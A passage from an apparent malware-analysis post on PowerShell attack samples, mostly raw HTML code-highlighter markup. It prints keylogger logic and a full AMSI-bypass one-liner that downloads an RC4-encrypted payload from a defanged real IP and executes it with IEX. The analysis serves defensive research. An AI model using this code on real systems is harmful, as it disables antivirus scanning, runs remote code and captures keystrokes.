</span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightAlt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Alt] '</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-22"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">TabKey</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">TabKey</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Tab] '</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-23"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">SpaceBar</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">SpaceBar</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[SpaceBar] '</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-24"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">DeleteKey</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">DeleteKey</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Delete] '</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-25"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">EnterKey</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">EnterKey</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Enter] '</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-26"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">BackSpaceKey</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">BackSpaceKey</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Backspace] '</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-27"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftArrow</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftArrow</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Left Arrow] '</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-28"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightArrow</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightArrow</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Right Arrow] '</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-29"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">UpArrow</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">UpArrow</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Up Arrow] '</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-30"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">DownArrow</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">DownArrow</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Down Arrow] '</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-31"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftMouse</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftMouse</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Left Mouse] '</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-32"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightMouse</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightMouse</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Right Mouse] '</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0041 seconds] -->
<p><strong>Other Techniques</strong></p>
<p><strong>AMSI Bypass (8 Samples – 0.20% Coverage)</strong></p>
<p>Antimalware Scan Interface (AMSI) is a new feature Microsoft released in Windows 10 and is designed to facilitate communication between applications and AV products. Ideally, the application (PowerShell in this context) will take the script at runtime, after it’s deobfuscated or pulled in remotely from a website, and pass it through AMSI to your AV for scanning. If the AV software determines it’s malicious, it can now block the scripts execution.</p>
<p>#YAOMG (Yet Another of Matt Graebers)</p>
<p>Matt Graeber released a one-line <a href="https://twitter.com/mattifestation/status/735261120487772160">tweet</a>  that shows how you can bypass AMSI by simply changing “amsiInitFailed” to “True”, which makes it appear as if it failed to load and effectively skips this check.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c99c776694572" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[ReF].ASSEmbly.GetTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIElD('amsiInitFailed','NonPublic,Static').SetVAlue($Null,$True)};[SySteM.Net.SErviCEPOINTMaNAger]::ExPeCt100ConTinue=0;$wC=NEW-OBjEcT System.NET.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERs.ADD('User-Agent',$u);$wC.PRoxY=[SYStEm.NET.WEBREQuEst]::DeFaUlTWEbProXY;$Wc.ProXY.CREDenTIALs = [SYSteM.NEt.CReDentIalCAcHe]::DeFAulTNetwORKCREdEntialS;$K=[SySTEm.TexT.EncodING]::ASCII.GETBYteS('Dv,inKZ&amp;lt;@{3mjG4&amp;amp;1k:Vcl7o)EY*J?6x');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bxor$S[($S[$I]+$S[$H])%256]}};$Wc.HEaDERs.ADD("Cookie","session=Pu8sEnIpxIwINbUOVsxlL66DoHA=");$ser='http://35.165.38[.]15:80';$t='/login/process.php';$dATa=$WC.DowNLOadDAtA($ser+$T);$IV=$DaTA[0..3];$Data=$DaTa[4..$DAtA.leNgTH];-JoIn[CHAr[]](&amp;amp; $R $data ($IV+$K))|IEX</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c99c776694572-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c99c776694572-1"><span class="crayon-sy">[</span><span class="crayon-v">ReF</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">ASSEmbly</span><span class="crayon-sy">.</span><span class="crayon-e">GetTYpe</span><span class="crayon-sy">(</span><span class="crayon-s">'System.Management.Automation.AmsiUtils'</span><span class="crayon-sy">)</span><span class="crayon-o">|</span><span class="crayon-sy">?</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">}</span><span class="crayon-o">|</span><span class="crayon-o">%</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">.</span><span class="crayon-e">GeTFIElD</span><span class="crayon-sy">(</span><span class="crayon-s">'amsiInitFailed'</span><span class="crayon-sy">,</span><span class="crayon-s">'NonPublic,Static'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">SetVAlue</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-t">Null</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-t">True</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-v">SySteM</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">SErviCEPOINTMaNAger</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">ExPeCt100ConTinue</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">wC</span><span class="crayon-o">=</span><span class="crayon-r">NEW</span><span class="crayon-o">-</span><span class="crayon-t">OBjEcT</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">NET</span><span class="crayon-sy">.</span><span class="crayon-v">WebClieNt</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">u</span><span class="crayon-o">=</span><span class="crayon-s">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">Wc</span><span class="crayon-sy">.</span><span class="crayon-v">HEAdERs</span><span class="crayon-sy">.</span><span class="crayon-e">ADD</span><span class="crayon-sy">(</span><span class="crayon-s">'User-Agent'</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">u</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">wC</span><span class="crayon-sy">.</span><span class="crayon-v">PRoxY</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">SYStEm</span><span class="crayon-sy">.</span><span class="crayon-v">NET</span><span class="crayon-sy">.</span><span class="crayon-v">WEBREQuEst</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">DeFaUlTWEbProXY</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">Wc</span><span class="crayon-sy">.</span><span class="crayon-v">ProXY</span><span class="crayon-sy">.</span><span class="crayon-v">CREDenTIALs</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">SYSteM</span><span class="crayon-sy">.</span><span class="crayon-v">NEt</span><span class="crayon-sy">.</span><span class="crayon-v">CReDentIalCAcHe</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">DeFAulTNetwORKCREdEntialS</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">K</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">SySTEm</span><span class="crayon-sy">.</span><span class="crayon-v">TexT</span><span class="crayon-sy">.</span><span class="crayon-v">EncodING</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">ASCII</span><span class="crayon-sy">.</span><span class="crayon-e">GETBYteS</span><span class="crayon-sy">(</span><span class="crayon-s">'Dv,inKZ&amp;lt;@{3mjG4&amp;amp;1k:Vcl7o)EY*J?6x'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">R</span><span class="crayon-o">=</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">D</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">K</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">ArGS</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-o">=</span><span class="crayon-cn">0..255</span><span class="crayon-sy">;</span><span class="crayon-cn">0..255</span><span class="crayon-o">|</span><span class="crayon-o">%</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">J</span><span class="crayon-o">=</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">J</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">K</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-o">%</span><span class="crayon-sy">$</span><span class="crayon-v">K</span><span class="crayon-sy">.</span><span class="crayon-v">COuNT</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-o">%</span><span class="crayon-cn">256</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">J</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">J</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">D</span><span class="crayon-o">|</span><span class="crayon-o">%</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">I</span><span class="crayon-o">=</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">I</span><span class="crayon-o">+</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-o">%</span><span class="crayon-cn">256</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">H</span><span class="crayon-o">=</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">H</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">I</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-o">%</span><span class="crayon-cn">256</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">I</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">H</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">H</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">I</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-o">-</span><span class="crayon-v">Bxor</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">I</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">S</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">H</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-o">%</span><span class="crayon-cn">256</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">Wc</span><span class="crayon-sy">.</span><span class="crayon-v">HEaDERs</span><span class="crayon-sy">.</span><span class="crayon-e">ADD</span><span class="crayon-sy">(</span><span class="crayon-s">"Cookie"</span><span class="crayon-sy">,</span><span class="crayon-s">"session=Pu8sEnIpxIwINbUOVsxlL66DoHA="</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ser</span><span class="crayon-o">=</span><span class="crayon-s">'http://35.165.38[.]15:80'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">t</span><span class="crayon-o">=</span><span class="crayon-s">'/login/process.php'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">dATa</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">WC</span><span class="crayon-sy">.</span><span class="crayon-e">DowNLOadDAtA</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ser</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">T</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">IV</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">DaTA</span><span class="crayon-sy">[</span><span class="crayon-cn">0..3</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">Data</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">DaTa</span><span class="crayon-sy">[</span><span class="crayon-cn">4..</span><span class="crayon-sy">$</span><span class="crayon-v">DAtA</span><span class="crayon-sy">.</span><span class="crayon-v">leNgTH</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-o">-</span><span class="crayon-v">JoIn</span><span class="crayon-sy">[</span><span class="crayon-t">CHAr</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">R</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-e">data</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">IV</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">K</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-o">|</span><span class="crayon-v">IEX</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0020 seconds] -->
<p>The code shares a similar signature to PowerShell Empire’s XOR routine for their EncryptedScriptDropper and may be related or borrowed code.</p>
<p><strong>PowerSploit GTS (3 Samples – 0.07% Coverage)</strong></p>
<p>This is set of samples that simply use a module from another tool, in this case, the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-TimedScreenshot.ps1">PowerSploit Get-TimedScreenshot</a>. The code will take a screenshot using Drawing.Bitmap every 2 seconds.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9a2903474191" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
